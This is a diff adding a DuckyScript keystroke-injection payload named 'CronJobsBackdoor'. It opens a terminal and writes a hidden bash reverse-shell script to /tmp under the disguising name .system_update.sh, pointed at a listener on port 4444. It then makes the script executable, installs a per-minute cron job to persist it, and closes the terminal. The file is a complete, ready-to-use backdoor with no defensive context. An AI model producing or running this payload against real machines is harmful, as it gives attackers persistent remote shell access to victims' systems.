@@ -1,0 +1,31 @@
+REM CronJobsBackdoor
+REM Open a terminal window
+DELAY 200
+ALT F2
+DELAY 500
+STRING qterminal
+DELAY 200
+ENTER
+
+REM Create a hidden .system_update.sh file in /tmp that will connect to the Netcat reverse shell listener when executed
+DELAY 1500
+STRING echo '#!/bin/bash\nbash -i >& /dev/tcp/127.0.0.1/4444 0>&1' > /tmp/.system_update.sh
+DELAY 200
+ENTER
+
+REM Change the permissions of .system_update.sh to make it executable
+STRING chmod +x /tmp/.system_update.sh
+DELAY 200
+ENTER
+DELAY 200
+
+REM Add a cron job that will run the .system_update.sh script every minute
+STRING (crontab -l 2>/dev/null; echo "* * * * * /tmp/.system_update.sh") | crontab -
+DELAY 200
+ENTER
+DELAY 200
+
+REM Close the terminal
+STRING exit
+DELAY 200
+ENTER
